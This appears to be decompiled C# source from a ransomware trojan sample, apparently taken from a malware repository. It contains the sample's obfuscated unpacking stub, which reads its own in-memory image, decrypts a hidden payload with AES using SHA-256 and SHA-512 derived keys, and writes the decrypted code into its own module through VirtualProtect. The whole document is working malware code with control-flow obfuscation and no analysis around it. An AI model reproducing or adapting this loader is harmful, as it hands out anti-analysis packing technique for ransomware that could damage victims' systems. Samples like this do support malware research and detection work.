// Decompiled with JetBrains decompiler
// Type: 챽ᥡ꾂궷䖢
// Assembly: WindowsFormsApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C9228A9B-F301-B819-D582-F815503479F8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.09-msil\HEUR-Trojan-Ransom.Win32.Generic-0c5c72f6b371e157babb410027a947c70555a1f9bf4e1900664249f4d51e3290.exe

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

internal static class 챽ᥡ꾂궷\uE361䖢\uE297\uF7BA
{
  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  private static extern bool 煇꺞\u32A9땸緼뵤ꏾ컓(
    IntPtr lpAddress,
    uint dwSize,
    uint flNewProtect,
    out uint lpflOldProtect);

  public static unsafe void \uF4E2啡\uF37E\u0C7C櫦㑻ಘⲾ()
  {
label_0:
    Module module = typeof (챽ᥡ꾂궷\uE361䖢\uE297\uF7BA).Module;
    int num1 = 1;
    IntPtr hinstance;
    while (true)
    {
      switch (num1)
      {
        case 0:
          goto label_0;
        case 2:
          if (hinstance == (IntPtr) -1)
          {
            Environment.FailFast("Module error");
            num1 = 3;
            continue;
          }
          goto label_5;
        case 3:
          goto label_5;
        default:
          hinstance = Marshal.GetHINSTANCE(module);
          num1 = 2;
          continue;
      }
    }
label_5:
    bool flag = module.FullyQualifiedName != "<Unknown>";
    Stream input = (Stream) new UnmanagedMemoryStream((byte*) hinstance.ToPointer(), 268435455L, 268435455L, FileAccess.ReadWrite);
    BinaryReader binaryReader1 = new BinaryReader(input);
label_6:
    byte[] array;
    byte[] iv;
    byte[] dat;
    ulong num2;
    try
    {
      input.Seek(60L, SeekOrigin.Begin);
      uint offset1 = binaryReader1.ReadUInt32();
      int num3 = 14;
      uint offset2;
      uint offset3;
      MemoryStream memoryStream;
      while (true)
      {
        int num4;
        int num5;
        do
        {
          uint num6;
          uint num7;
          uint num8;
          uint num9;
          int num10;
          int num11;
          byte num12;
          int num13;
          do
          {
            uint num14;
            long num15;
            long num16;
            do
            {
              int num17;
              switch (num3)
              {
                case 0:
                  goto label_6;
                case 2:
                  ++num17;
                  break;
                case 3:
                  num17 = 0;
                  break;
                case 4:
                  goto label_13;
                case 5:
                  goto label_14;
                case 6:
                  goto label_15;
                case 7:
                  goto label_16;
                case 8:
                  goto label_18;
                case 9:
                  goto label_19;
                case 10:
                  goto label_20;
                case 11:
                  goto label_37;
                case 12:
                  goto label_23;
                case 13:
                  goto label_25;
                case 14:
                  goto label_26;
                case 15:
                  goto label_27;
                case 16:
                  goto label_29;
                case 17:
                  goto label_30;
                case 18:
                  goto label_32;
                case 19:
                  goto label_33;
                case 20:
                  goto label_34;
                case 21:
                  goto label_35;
                case 22:
                  goto label_36;
                case 23:
                  goto label_39;
                case 24:
                  goto label_41;
                default:
                  int num18 = (int) binaryReader1.ReadUInt16();
                  num3 = 13;
                  continue;
              }
              num15 = (long) num17;
              num16 = (long) num14;
              num3 = 9;
            }
            while (num15 < num16);
            num3 = 4;
            continue;
label_13:
            input.Seek((long) offset2, SeekOrigin.Begin);
            num3 = 21;
            continue;
label_14:
            input.Seek(6L, SeekOrigin.Current);
            num14 = (uint) binaryReader1.ReadUInt16();
            num3 = 8;
            continue;
label_15:
            offset2 = binaryReader1.ReadUInt32() ^ 1019349625U;
            num3 = 15;
            continue;
label_16:
            if (offset2 < num6 + num7)
            {
              offset2 = offset2 - num6 + num8;
              num3 = 20;
              continue;
            }
            goto label_34;
label_18:
            input.Seek(12L, SeekOrigin.Current);
            num9 = (uint) binaryReader1.ReadUInt16();
            input.Seek((long) (offset1 += 24U), SeekOrigin.Begin);
            num3 = 1;
            continue;
label_19:
            num10 = 0;
            num11 = 0;
            num3 = 11;
            continue;
label_20:
            num13 = (int) num12;
            num3 = 22;
          }
          while (num13 == 0);
          num3 = 16;
          continue;
label_23:
          int num19;
          if (!flag)
          {
            num19 = (int) num8;
            goto label_42;
          }
          else
            goto label_41;
label_25:
          input.Seek(62L, SeekOrigin.Current);
          num3 = 18;
          continue;
label_26:
          input.Seek((long) offset1, SeekOrigin.Begin);
          num3 = 5;
          continue;
label_27:
          if ((int) offset2 == -1668697245 - 1606920426)
          {
            num3 = 17;
            continue;
          }
          goto label_31;
label_29:
          num10 += (int) num12;
          num3 = 22;
          continue;
label_30:
          Environment.FailFast("Broken file");
label_31:
          input.Seek((long) (offset1 += num9), SeekOrigin.Begin);
          offset3 = 0U;
          num3 = 3;
          continue;
label_32:
          long position = input.Position;
          num3 = 6;
          continue;
label_33:
          num7 = binaryReader1.ReadUInt32();
          num3 = 23;
          continue;
label_34:
          input.Seek(16L, SeekOrigin.Current);
          num3 = 2;
          continue;
label_35:
          memoryStream = new MemoryStream();
          goto label_46;
label_36:
          ++num11;
label_37:
          if (num11 < 8)
          {
            num12 = binaryReader1.ReadByte();
            num3 = 10;
            continue;
          }
          num3 = 19;
          continue;
label_39:
          num6 = binaryReader1.ReadUInt32();
          int num20 = (int) binaryReader1.ReadUInt32();
          num8 = binaryReader1.ReadUInt32();
          if (num10 == 1078410940 - 1078410247)
          {
            num3 = 12;
            continue;
          }
          goto label_43;
label_41:
          num19 = (int) num6;
label_42:
          offset3 = (uint) num19;
label_43:
          if (!flag)
          {
            num4 = (int) offset2;
            num5 = (int) num6;
            num3 = 20;
          }
          else
            goto label_34;
        }
        while ((uint) num4 <= (uint) num5);
        num3 = 7;
      }
label_46:
      try
      {
        input.Position += 12L;
        input.Position += (long) (binaryReader1.ReadUInt32() + 4U);
        int num21 = 1;
        while (true)
        {
          int num22;
          ushort num23;
          int num24;
          int num25;
          do
          {
            switch (num21)
            {
              case 0:
                goto label_46;
              case 2:
              case 5:
                if (num22 >= (int) num23)
                {
                  array = memoryStream.ToArray();
                  goto label_63;
                }
                else
                  goto label_55;
              case 3:
                ++num24;
                goto case 7;
              case 4:
                goto label_54;
              case 6:
                goto label_56;
              case 7:
                num25 = (int) binaryReader1.ReadByte();
                num21 = 3;
                continue;
              case 8:
                goto label_57;
              case 9:
                goto label_58;
              case 10:
                goto label_59;
              default:
                input.Position += 2L;
                num21 = 6;
                continue;
            }
          }
          while (num25 != 0);
          num21 = 10;
          continue;
label_54:
          uint count = binaryReader1.ReadUInt32();
          num24 = 0;
          num21 = 7;
          continue;
label_55:
          uint num26 = binaryReader1.ReadUInt32() + offset2;
          num21 = 4;
          continue;
label_56:
          num23 = binaryReader1.ReadUInt16();
          num22 = 0;
          num21 = 5;
          continue;
label_57:
          input.Position = (long) num26;
          memoryStream.Write(binaryReader1.ReadBytes((int) count), 0, (int) count);
          num21 = 9;
          continue;
label_58:
          long num27;
          input.Position = num27;
          ++num22;
          num21 = 2;
          continue;
label_59:
          num27 = (input.Position += (long) ((num24 + 1 + 3 & -4) - (num24 + 1)));
          num21 = 8;
        }
      }
      finally
      {
        memoryStream?.Dispose();
      }
label_63:
      input.Seek((long) offset3, SeekOrigin.Begin);
      int num28 = 4;
      while (true)
      {
        switch (num28)
        {
          case 0:
            goto label_63;
          case 2:
            iv = binaryReader1.ReadBytes(binaryReader1.ReadInt32() ^ 1502973209);
            num28 = 3;
            continue;
          case 3:
            goto label_67;
          case 4:
            num2 = binaryReader1.ReadUInt64() ^ 8490631312849551929UL;
            binaryReader1.ReadInt32();
            num28 = 1;
            continue;
          default:
            binaryReader1.ReadInt32();
            num28 = 2;
            continue;
        }
      }
label_67:
      dat = binaryReader1.ReadBytes(binaryReader1.ReadInt32() ^ 465351866 - 12658723);
    }
    finally
    {
      binaryReader1?.Dispose();
    }
label_72:
    byte[] hash = MD5.Create().ComputeHash(array);
    int num29 = 3;
    BinaryReader binaryReader2;
    while (true)
    {
      int num30;
      int num31;
      do
      {
        ulong num32;
        byte[] src;
        switch (num29)
        {
          case 0:
            goto label_72;
          case 2:
            if ((long) num32 != (long) num2)
            {
              Environment.FailFast("Broken file");
              num29 = 4;
              continue;
            }
            goto case 4;
          case 3:
            num32 = BitConverter.ToUInt64(hash, 0) ^ BitConverter.ToUInt64(hash, 8);
            num29 = 2;
            continue;
          case 4:
            src = 챽ᥡ꾂궷\uE361䖢\uE297\uF7BA.罶ﲀ\u2EB1ꈾ\uFFFD\uFFFD粎額(array, iv, dat);
            num29 = 6;
            continue;
          case 5:
            byte[] numArray = new byte[src.Length - 2];
            Buffer.BlockCopy((Array) src, 2, (Array) numArray, 0, numArray.Length);
            binaryReader2 = new BinaryReader((Stream) new MemoryStream(numArray));
            goto label_83;
          case 6:
            Buffer.BlockCopy((Array) new byte[array.Length], 0, (Array) array, 0, array.Length);
            if ((int) src[0] == 1648587526 - 1319509351 - 329077961)
            {
              num30 = (int) src[1];
              num31 = 398814241 - (1246054327 ^ 1476112243 ^ 175866742);
              num29 = 5;
              continue;
            }
            break;
        }
        Environment.FailFast("Broken file");
        num29 = 5;
      }
      while (num30 == num31);
      num29 = 1;
    }
label_83:
    try
    {
      uint length = binaryReader2.ReadUInt32();
      int[] numArray1 = new int[(IntPtr) length];
      IntPtr[] numArray2 = new IntPtr[(IntPtr) length];
      int num33 = 4;
      while (true)
      {
        IntPtr num34;
        byte[] source;
        uint lpflOldProtect;
        int index;
        uint num35;
        uint num36;
        int num37;
        do
        {
          switch (num33)
          {
            case 0:
              goto label_83;
            case 2:
              source = binaryReader2.ReadBytes(binaryReader2.ReadInt32());
              num34 = (IntPtr) (long) (uint) ((int) hinstance + (flag ? (int) num36 : (int) num35));
              num33 = 3;
              continue;
            case 3:
              챽ᥡ꾂궷\uE361䖢\uE297\uF7BA.煇꺞\u32A9땸緼뵤ꏾ컓(num34, (uint) source.Length, 4U, out lpflOldProtect);
              Marshal.Copy(source, 0, num34, source.Length);
              num33 = 1;
              continue;
            case 4:
              index = 0;
              num33 = 7;
              continue;
            case 5:
              ++index;
              goto case 7;
            case 6:
              goto label_92;
            case 7:
              if ((long) index >= (long) length)
              {
                num33 = 6;
                continue;
              }
              num35 = binaryReader2.ReadUInt32() ^ (uint) (444143045 + 619951942);
              num33 = 10;
              continue;
            case 8:
              num36 = binaryReader2.ReadUInt32() ^ 3405573982U;
              num33 = 2;
              continue;
            case 9:
              numArray2[index] = num34;
              num33 = 5;
              continue;
            case 10:
              num37 = (int) num35;
              num33 = 5;
              continue;
            default:
              챽ᥡ꾂궷\uE361䖢\uE297\uF7BA.煇꺞\u32A9땸緼뵤ꏾ컓(num34, (uint) source.Length, lpflOldProtect, out lpflOldProtect);
              numArray1[index] = source.Length;
              num33 = 9;
              continue;
          }
        }
        while (num37 == 0);
        num33 = 8;
      }
label_92:;
    }
    finally
    {
      binaryReader2?.Dispose();
    }
  }

  private static byte[] 罶ﲀ\u2EB1ꈾ\uFFFD\uFFFD粎額(byte[] buff, byte[] iv, byte[] dat)
  {
label_0:
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    byte[] buffer = new byte[dat.Length];
    int num1 = 1;
    MemoryStream memoryStream;
    while (true)
    {
      switch (num1)
      {
        case 0:
          goto label_0;
        case 2:
          goto label_3;
        default:
          memoryStream = new MemoryStream(dat);
          num1 = 2;
          continue;
      }
    }
label_3:
    using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(SHA256.Create().ComputeHash(buff), iv), CryptoStreamMode.Read))
      cryptoStream.Read(buffer, 0, dat.Length);
label_8:
    SHA512 shA512 = SHA512.Create();
    byte[] hash = shA512.ComputeHash(buff);
    int num2 = 10;
    while (true)
    {
      int num3;
      do
      {
        int index;
        int offset;
        int num4;
        int num5;
        int length;
        int num6;
        do
        {
          int num7;
          do
          {
            switch (num2)
            {
              case 0:
                goto label_8;
              case 2:
                offset += (-2062995972 - 169142198 ^ 1840598791 ^ -1788949888 - (757257664 + 297412409)) - 1103152262;
                num2 = 11;
                continue;
              case 3:
                ++index;
                goto case 6;
              case 4:
                goto label_15;
              case 5:
                goto label_16;
              case 6:
                num7 = index < num4 ? 1 : 0;
                num2 = 1;
                continue;
              case 7:
                goto label_17;
              case 8:
                goto label_19;
              case 9:
                goto label_21;
              case 10:
                goto label_22;
              case 11:
                goto label_23;
              default:
                buffer[index] ^= (byte) ((uint) hash[index - offset] ^ (uint) ((946507737 ^ (1297373028 ^ 754707417) - 490431315) - 2082395788));
                num2 = 3;
                continue;
            }
          }
          while (num7 != 0);
          num2 = 9;
          continue;
label_15:
          num5 = offset + 64;
          goto label_20;
label_16:
          return buffer;
label_17:
          length = buffer.Length;
          num6 = offset + (2049091581 - 1457706490 - 591385027);
          num2 = 8;
        }
        while (length <= num6);
        num2 = 4;
        continue;
label_19:
        num5 = buffer.Length;
label_20:
        num4 = num5;
        index = offset;
        num2 = 6;
        continue;
label_21:
        hash = shA512.ComputeHash(buffer, offset, num4 - offset);
        num2 = 2;
        continue;
label_22:
        offset = 0;
        num2 = 11;
        continue;
label_23:
        num3 = offset < buffer.Length ? 1 : 0;
        num2 = 7;
      }
      while (num3 != 0);
      num2 = 5;
    }
  }
}
